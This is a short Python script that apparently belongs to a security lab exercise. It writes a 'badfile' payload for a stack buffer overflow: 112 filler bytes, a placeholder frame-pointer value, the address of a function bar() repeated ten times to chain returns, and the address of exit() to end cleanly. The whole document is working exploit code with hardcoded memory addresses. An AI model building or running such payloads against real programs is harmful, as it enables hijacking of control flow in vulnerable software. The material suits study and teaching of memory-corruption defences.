#!/usr/bin/python3
import sys

def tobytes (value):
   return (value).to_bytes(4,byteorder='little')

bar_addr   = 0x08048567  # Address of bar()
exit_addr  = 0xb7e369d0  # Address of exit()

content = bytearray(0xaa for i in range(112))
content += tobytes(0xFFFFFFFF)  # This value is not important here.
for i in range(10):           
   content += tobytes(bar_addr)

# Invoke exit() to exit gracefully at the end
content += tobytes(exit_addr)

# Write the content to a file
with open("badfile", "wb") as f:
  f.write(content)
